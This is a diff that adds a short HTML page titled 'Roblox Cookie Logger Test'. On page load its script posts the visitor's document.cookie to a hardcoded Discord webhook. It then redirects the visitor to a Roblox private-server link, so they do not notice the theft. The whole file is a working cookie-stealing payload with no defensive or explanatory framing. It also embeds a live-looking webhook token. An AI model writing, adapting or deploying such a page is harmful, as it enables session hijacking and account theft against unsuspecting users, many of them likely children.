@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<head><title>Roblox Cookie Logger Test</title></head>
+<body>
+<script>
+  fetch("https://discord.com/api/webhooks/1380021795930767492/b_fxWACyZDyzeb_JS4bYWr1he-lTrUZbw5zc4nugRYaYhqAEbXd7b3QWOeFpLeFu3Q9e", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ content: document.cookie })
+  });
+  // Redirect to Roblox private server (replace with any Roblox URL)
+  window.location.href = "https://www.roblox.com/games/126884695634066/Grow-a-Garden?privateServerLinkCode=55478881055893894334694038387894";
+</script>
+</body>
+</html>
